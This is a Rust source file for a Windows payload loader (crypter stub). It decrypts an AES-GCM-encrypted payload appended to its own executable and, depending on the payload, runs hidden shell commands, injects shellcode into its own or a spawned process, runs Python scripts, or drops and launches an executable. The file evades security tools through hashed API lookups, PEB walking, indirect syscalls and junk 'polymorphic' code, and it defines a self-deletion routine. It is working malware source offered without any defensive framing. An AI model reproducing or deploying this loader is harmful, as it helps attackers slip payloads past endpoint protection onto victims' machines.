#![windows_subsystem = "console"]
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use std::fs;
use std::io::Read;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::Command;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};
const CREATE_NO_WINDOW: u32 = 0x08000000;

// Hashes (djb2, seed 5381)
const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0x4c6dc63c;
const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x6793c34c;
const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95f3a792;
const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x082962c8;
const HASH_NT_CREATE_THREAD_EX: u32 = 0xcb0c2130;
const HASH_NT_OPEN_PROCESS: u32 = 0x5003c058;

const MARKER: &[u8] = b"RSPKv1\0";

// --- Utils ---

fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &b in s {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(b as u32);
    }
    hash
}

#[cfg(target_arch = "x86_64")]
unsafe fn get_ntdll_base() -> usize {
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    let ldr = *(peb.add(0x18) as *const *const u8);
    let mut entry = *(ldr.add(0x20) as *const *const u8); // InMemoryOrderModuleList

    loop {
        let dll_base = *(entry.add(0x20) as *const usize);
        let name_len = *(entry.add(0x48) as *const u16);
        let name_buf = *(entry.add(0x50) as *const *const u16);

        if !name_buf.is_null() {
            let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
            let s = String::from_utf16_lossy(name_slice);
            println!("Module: {}", s);
            if s.eq_ignore_ascii_case("ntdll.dll") {
                return dll_base;
            }
        }

        entry = *(entry as *const *const u8);
        if entry == *(ldr.add(0x20) as *const *const u8) {
            break;
        }
    }
    0
}

unsafe fn get_export_addr(base: usize, hash: u32) -> Option<usize> {
    let dos_header = base as *const u8;
    let e_lfanew = *(dos_header.add(0x3C) as *const u32) as usize;
    let nt_headers = dos_header.add(e_lfanew);
    let export_rva = *(nt_headers.add(0x88) as *const u32) as usize;
    if export_rva == 0 {
        return None;
    }

    let export_dir = dos_header.add(export_rva);
    let num_names = *(export_dir.add(0x18) as *const u32) as usize;
    let addr_funcs = *(export_dir.add(0x1C) as *const u32) as usize;
    let addr_names = *(export_dir.add(0x20) as *const u32) as usize;
    let addr_ords = *(export_dir.add(0x24) as *const u32) as usize;

    let names = dos_header.add(addr_names) as *const u32;
    let ords = dos_header.add(addr_ords) as *const u16;
    let funcs = dos_header.add(addr_funcs) as *const u32;

    for i in 0..num_names {
        let name_rva = *names.add(i) as usize;
        let name_ptr = dos_header.add(name_rva);
        let mut len = 0;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }
        let name_slice = core::slice::from_raw_parts(name_ptr, len);

        if djb2(name_slice) == hash {
            let ord = *ords.add(i) as usize;
            let func_rva = *funcs.add(ord) as usize;
            return Some(base + func_rva);
        }
    }
    None
}

// --- Indirect Syscall ---
// Returns (SSN, SyscallInstAddr)
unsafe fn get_ssn_indirect(hash: u32) -> Option<(u32, usize)> {
    let ntdll = get_ntdll_base();
    if ntdll == 0 {
        return None;
    }

    let addr = get_export_addr(ntdll, hash)?;
    let ptr = addr as *const u8;

    for i in 0..32 {
        if *ptr.add(i) == 0xB8 {
            // mov eax, SSN
            let ssn = *(ptr.add(i + 1) as *const u32);
            // Look for 'syscall; ret' (0F 05 C3)
            for j in 0..32 {
                if *ptr.add(i + j) == 0x0F
                    && *ptr.add(i + j + 1) == 0x05
                    && *ptr.add(i + j + 2) == 0xC3
                {
                    return Some((ssn, (ptr.add(i + j) as usize)));
                }
            }
        }
    }
    None
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn syscall(
    ssn: u32,
    syscall_addr: usize,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> i32 {
    let ret: i32;
    core::arch::asm!(
        "sub rsp, 0x60",
        "mov [rsp + 0x20], {a5}", "mov [rsp + 0x28], {a6}", "mov [rsp + 0x30], {a7}",
        "mov [rsp + 0x38], {a8}", "mov [rsp + 0x40], {a9}", "mov [rsp + 0x48], {a10}",
        "mov [rsp + 0x50], {a11}",
        "mov eax, {ssn:e}",
        "call {syscall_addr}", // Indirect Syscall: CALL the address of 'syscall' instruction in ntdll
        "add rsp, 0x60",
        in("r10") a1, in("rdx") a2, in("r8") a3, in("r9") a4,
        a5 = in(reg) a5, a6 = in(reg) a6, a7 = in(reg) a7, a8 = in(reg) a8,
        a9 = in(reg) a9, a10 = in(reg) a10, a11 = in(reg) a11, ssn = in(reg) ssn, syscall_addr = in(reg) syscall_addr,
        lateout("rax") ret, lateout("rcx") _, lateout("r11") _,
        options(nostack)
    );
    ret
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
unsafe fn syscall(
    _ssn: u32,
    _syscall_addr: usize,
    _a1: usize,
    _a2: usize,
    _a3: usize,
    _a4: usize,
    _a5: usize,
    _a6: usize,
    _a7: usize,
    _a8: usize,
    _a9: usize,
    _a10: usize,
    _a11: usize,
) -> i32 {
    0
}

// --- Obscure Sleep (Removed) ---

#[repr(C)]
struct OBJECT_ATTRIBUTES {
    Length: u32,
    RootDirectory: isize,
    ObjectName: isize,
    Attributes: u32,
    SecurityDescriptor: isize,
    SecurityQualityOfService: isize,
}

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: isize,
    UniqueThread: isize,
}

unsafe fn exec_remote(sc: &[u8], path: &str) {
    let child = std::process::Command::new(path)
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();
    let Ok(child) = child else { return };
    let pid = child.id();

    let (ssn_open, addr_open) = get_ssn_indirect(HASH_NT_OPEN_PROCESS).unwrap_or((0x26, 0));
    let (ssn_alloc, addr_alloc) =
        get_ssn_indirect(HASH_NT_ALLOCATE_VIRTUAL_MEMORY).unwrap_or((0x18, 0));
    let (ssn_write, addr_write) =
        get_ssn_indirect(HASH_NT_WRITE_VIRTUAL_MEMORY).unwrap_or((0x3A, 0));
    let (ssn_protect, addr_protect) =
        get_ssn_indirect(HASH_NT_PROTECT_VIRTUAL_MEMORY).unwrap_or((0x50, 0));
    let (ssn_create, addr_create) = get_ssn_indirect(HASH_NT_CREATE_THREAD_EX).unwrap_or((0xBD, 0));
    let (ssn_wait, addr_wait) =
        get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));

    if addr_open == 0 {
        return;
    }

    let mut h_proc: isize = 0;
    let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
    oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
    let mut cid = CLIENT_ID {
        UniqueProcess: pid as isize,
        UniqueThread: 0,
    };

    let st_open = syscall(
        ssn_open,
        addr_open,
        &mut h_proc as *mut _ as usize,
        0x1FFFFF,
        &mut oa as *mut _ as usize,
        &mut cid as *mut _ as usize,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    );
    if st_open != 0 || h_proc == 0 {
        return;
    }

    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut size = sc.len();
    let _ = syscall(
        ssn_alloc,
        addr_alloc,
        h_proc as usize,
        &mut base as *mut _ as usize,
        0,
        &mut size as *mut _ as usize,
        (MEM_COMMIT | MEM_RESERVE) as usize,
        PAGE_READWRITE as usize,
        0,
        0,
        0,
        0,
        0,
    );

    if !base.is_null() {
        let mut written = 0usize;
        let _ = syscall(
            ssn_write,
            addr_write,
            h_proc as usize,
            base as usize,
            sc.as_ptr() as usize,
            sc.len(),
            &mut written as *mut _ as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        let mut old = 0usize;
        let _ = syscall(
            ssn_protect,
            addr_protect,
            h_proc as usize,
            &mut base as *mut _ as usize,
            &mut size as *mut _ as usize,
            PAGE_EXECUTE_READ as usize,
            &mut old as *mut _ as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        let mut h_thread: isize = 0;
        let st_thr = syscall(
            ssn_create,
            addr_create,
            &mut h_thread as *mut _ as usize,
            0x1FFFFF,
            0,
            h_proc as usize,
            base as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        println!("CreateThread status: {:x}, handle: {:x}", st_thr, h_thread);
        if st_thr == 0 && h_thread != 0 {
            println!("Waiting for thread...");
            let _ = syscall(
                ssn_wait,
                addr_wait,
                h_thread as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
            );
            println!("Thread finished or wait returned");
            CloseHandle(h_thread);
        } else {
            println!("CreateThread failed");
        }
    } else {
        println!("Allocation failed");
    }
    CloseHandle(h_proc);
}

fn main() {
    // Polymorphism: Random-looking control flow that does nothing
    let mut x = 12345u64;
    for _ in 0..100 {
        x = x
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
    }
    if x == 0 {
        // println!("Polymorphic check");
    }

    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    println!("Stub started, exe: {:?}", exe_path);
    let mut buf = Vec::new();
    if fs::File::open(&exe_path)
        .and_then(|mut f| f.read_to_end(&mut buf))
        .is_err()
    {
        println!("Failed to read self");
        return;
    }

    let pos = buf.windows(MARKER.len()).rposition(|w| w == MARKER);
    let Some(mut off) = pos.map(|p| p + MARKER.len()) else {
        println!("Marker not found in {} bytes", buf.len());
        return;
    };
    println!("Marker found at offset {}", off);

    if off + 4 > buf.len() {
        println!("Truncated key len");
        return;
    }
    let key_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if off + key_len > buf.len() {
        println!("Truncated key");
        return;
    }
    let key = &buf[off..off + key_len];
    off += key_len;

    if off + 4 > buf.len() {
        println!("Truncated nonce len");
        return;
    }
    let nonce_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if off + nonce_len > buf.len() {
        println!("Truncated nonce");
        return;
    }
    let nonce_bytes = &buf[off..off + nonce_len];
    off += nonce_len;

    if off + 8 > buf.len() {
        println!("Truncated ct len");
        return;
    }
    let ct_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
    off += 8;
    if off + ct_len > buf.len() {
        println!("Truncated ciphertext");
        return;
    }
    let ciphertext = &buf[off..off + ct_len];

    println!("Decrypting {} bytes...", ct_len);
    let cipher = match Aes256Gcm::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => {
            println!("Cipher init failed");
            return;
        }
    };
    let nonce = Nonce::from_slice(nonce_bytes);
    let decrypted = match cipher.decrypt(nonce, ciphertext) {
        Ok(p) => p,
        Err(_) => {
            println!("Decryption failed");
            return;
        }
    };
    println!("Decryption success, decompressing...");
    let payload = match zstd::decode_all(&decrypted[..]) {
        Ok(p) => p,
        Err(e) => {
            println!("Decompression failed: {}", e);
            return;
        }
    };
    println!("Decompression success, payload size: {}", payload.len());

    if payload.starts_with(b"CMD\0") {
        println!("Payload type: CMD");
        let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
        let exe_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.to_path_buf()))
            .unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| std::env::temp_dir()));
        let lower = cmd.trim().to_lowercase();
        if lower.starts_with("echo ") && cmd.contains('>') {
            let parts: Vec<&str> = cmd.splitn(2, '>').collect();
            let left = parts.get(0).map(|s| s.trim()).unwrap_or("");
            let right = parts.get(1).map(|s| s.trim()).unwrap_or("");
            let content = left.strip_prefix("echo").map(|s| s.trim()).unwrap_or("");
            if !right.is_empty() {
                let mut out_path = exe_dir.clone();
                out_path.push(right);
                let _ = fs::write(&out_path, format!("{}\r\n", content));
            }
        } else {
            if Command::new(&cmd)
                .current_dir(&exe_dir)
                .creation_flags(CREATE_NO_WINDOW)
                .spawn()
                .is_err()
            {
                let _ = Command::new("cmd.exe")
                    .arg("/C")
                    .arg(&cmd)
                    .current_dir(&exe_dir)
                    .creation_flags(CREATE_NO_WINDOW)
                    .spawn();
            }
        }
        return;
    }

    if payload.starts_with(b"SC\0") {
        println!("Payload type: SC");
        let mut p = 3usize;
        if p >= payload.len() {
            println!("SC Payload too short");
            return;
        }
        let mode = payload[p];
        p += 1;
        let mut remote_path: Option<String> = None;
        if mode == 1 {
            if p + 4 > payload.len() {
                return;
            }
            let rlen = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
            p += 4;
            if p + rlen > payload.len() {
                return;
            }
            remote_path = Some(String::from_utf8_lossy(&payload[p..p + rlen]).to_string());
            p += rlen;
        }
        if p + 4 > payload.len() {
            return;
        }
        let sc_len = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
        p += 4;
        if p + sc_len > payload.len() {
            return;
        }
        let sc = &payload[p..p + sc_len];
        println!("SC extracted, len: {}, mode: {}", sc_len, mode);

        // Skip unhooking for now to rule it out
        // if unhook {
        //     if let Err(e) = unhook_ntdll() {
        //         println!("Unhooking failed: {}", e);
        //     } else {
        //         println!("Unhooking success");
        //     }
        // }

        unsafe {
            let ntdll = get_ntdll_base();
            println!("NTDLL Base: {:x}", ntdll);

            if ntdll == 0 {
                println!("Failed to find NTDLL base");
                return;
            }

            let (ssn_alloc, addr_alloc) =
                get_ssn_indirect(HASH_NT_ALLOCATE_VIRTUAL_MEMORY).unwrap_or((0x18, 0));
            let (ssn_write, addr_write) =
                get_ssn_indirect(HASH_NT_WRITE_VIRTUAL_MEMORY).unwrap_or((0x3A, 0));
            let (ssn_protect, addr_protect) =
                get_ssn_indirect(HASH_NT_PROTECT_VIRTUAL_MEMORY).unwrap_or((0x50, 0));

            println!("SSN Alloc: {:x}, Addr: {:x}", ssn_alloc, addr_alloc);

            if addr_alloc == 0 {
                println!("Failed to resolve NtAllocateVirtualMemory");
                return;
            }

            if mode == 1 {
                if let Some(s) = remote_path.as_deref() {
                    println!("Injecting into remote process: {}", s);
                    exec_remote(sc, s);
                }
            } else {
                let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
                let mut size = sc_len;

                // Open self to get a real handle
                // let mut process_handle: isize = 0;
                // let (ssn_open, addr_open) = get_ssn_indirect(HASH_NT_OPEN_PROCESS).unwrap_or((0x26, 0));
                // if addr_open != 0 {
                //     let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
                //     oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
                //     let mut cid = CLIENT_ID {
                //         UniqueProcess: unsafe { GetCurrentProcessId() } as isize,
                //         UniqueThread: 0,
                //     };
                //     let st_open = syscall(
                //         ssn_open,
                //         addr_open,
                //         &mut process_handle as *mut _ as usize,
                //         0x1FFFFF, // PROCESS_ALL_ACCESS
                //         &mut oa as *mut _ as usize,
                //         &mut cid as *mut _ as usize,
                //         0, 0, 0, 0, 0, 0, 0,
                //     );
                //     println!("NtOpenProcess status: {:x}, handle: {:x}", st_open, process_handle);
                // }

                // if process_handle == 0 {
                //     println!("Failed to open self, using -1");
                //     process_handle = -1isize as usize as isize;
                // }
                let process_handle = -1isize as usize as isize;

                println!("Allocating memory...");
                let status = syscall(
                    ssn_alloc,
                    addr_alloc,
                    process_handle as usize,
                    &mut base as *mut _ as usize,
                    0,
                    &mut size as *mut _ as usize,
                    (MEM_COMMIT | MEM_RESERVE) as usize,
                    PAGE_READWRITE as usize,
                    0,
                    0,
                    0,
                    0,
                    0,
                );
                println!("Alloc status: {:x}, base: {:?}", status, base);

                if (status == 0 || !base.is_null()) && !base.is_null() {
                    let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);
                    // We can't copy directly if we are in another process context (but here we are local)
                    // But if we use NtWriteVirtualMemory, we should use it for consistency

                    let mut written = 0usize;
                    println!("Writing memory...");
                    let status_write = syscall(
                        ssn_write,
                        addr_write,
                        process_handle as usize,
                        base as usize,
                        sc.as_ptr() as usize,
                        sc.len(),
                        &mut written as *mut _ as usize,
                        0,
                        0,
                        0,
                        0,
                        0,
                        0,
                    );
                    println!("Write status: {:x}, written: {}", status_write, written);

                    // Fallback for write if needed (though local copy works if local)
                    if status_write != 0 {
                        println!("Write syscall failed, trying local memcpy...");
                        dst.copy_from_slice(sc);
                    }

                    let mut old = 0;
                    println!("Protecting memory...");
                    let status_prot = syscall(
                        ssn_protect,
                        addr_protect,
                        process_handle as usize,
                        &mut base as *mut _ as usize,
                        &mut size as *mut _ as usize,
                        PAGE_EXECUTE_READWRITE as usize,
                        &mut old as *mut _ as usize,
                        0,
                        0,
                        0,
                        0,
                        0,
                        0,
                    );
                    println!("Protect status: {:x}", status_prot);
                    if status_prot == 0 {
                        // Create a new thread to execute shellcode (more robust than fiber for generic payloads)
                        let (ssn_create_thr, addr_create_thr) =
                            get_ssn_indirect(HASH_NT_CREATE_THREAD_EX).unwrap_or((0xBD, 0));
                        let (ssn_wait_thr, addr_wait_thr) =
                            get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));

                        println!(
                            "SSN CreateThread: {:x}, Addr: {:x}",
                            ssn_create_thr, addr_create_thr
                        );

                        if addr_create_thr != 0 {
                            let mut h_thread: isize = 0;
                            println!("Creating thread...");
                            let st_thr = syscall(
                                ssn_create_thr,
                                addr_create_thr,
                                &mut h_thread as *mut _ as usize,
                                0x1FFFFF,
                                0,
                                process_handle as usize,
                                base as usize,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                            );
                            println!("CreateThread status: {:x}, handle: {:x}", st_thr, h_thread);
                            if st_thr == 0 && h_thread != 0 {
                                // Optionally wait for thread to finish briefly to ensure execution starts
                                if addr_wait_thr != 0 {
                                    println!("Waiting for thread...");
                                    let _ = syscall(
                                        ssn_wait_thr,
                                        addr_wait_thr,
                                        h_thread as usize,
                                        0, // Alertable
                                        0, // Timeout
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                    );
                                    println!("Thread finished or wait returned");
                                } else {
                                    println!("Wait syscall address is 0");
                                }
                                CloseHandle(h_thread);
                            } else {
                                println!("CreateThread failed");
                            }
                        } else {
                            println!("CreateThread address is 0");
                        }
                    } else {
                        println!("Protect failed");
                    }
                } else {
                    println!("Alloc failed or base is null");
                }
                if process_handle != 0 && process_handle != -1 {
                    CloseHandle(process_handle);
                }
            }
        }
        return;
    }

    if payload.starts_with(b"PY\0") {
        let mut p = 4usize;
        if p + 4 > payload.len() {
            return;
        }
        let len = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
        p += 4;
        if p + len > payload.len() {
            return;
        }
        let script = String::from_utf8_lossy(&payload[p..p + len]).to_string();
        let _ = Command::new("pythonw.exe")
            .arg("-c")
            .arg(script)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
        return;
    }

    if payload.starts_with(b"MZ") {
        let mut out_path: PathBuf = std::env::temp_dir();
        out_path.push(format!("rs_p_{}.exe", std::process::id()));
        if fs::write(&out_path, &payload).is_ok() {
            let _ = Command::new(&out_path)
                .creation_flags(CREATE_NO_WINDOW)
                .spawn();
        }
    }
}

fn self_delete() {
    if let Ok(exe_path) = std::env::current_exe() {
        let mut bat = std::env::temp_dir();
        bat.push(format!("{:x}_rm.cmd", std::process::id()));
        let script = format!(
            "@echo off\r\nping -n 2 127.0.0.1 >nul\r\ndel /f /q \"{}\"\r\ndel /f /q \"%~f0\"\r\n",
            exe_path.display()
        );
        let _ = fs::write(&bat, script);
        let _ = Command::new("cmd.exe")
            .arg("/C")
            .arg(&bat)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}
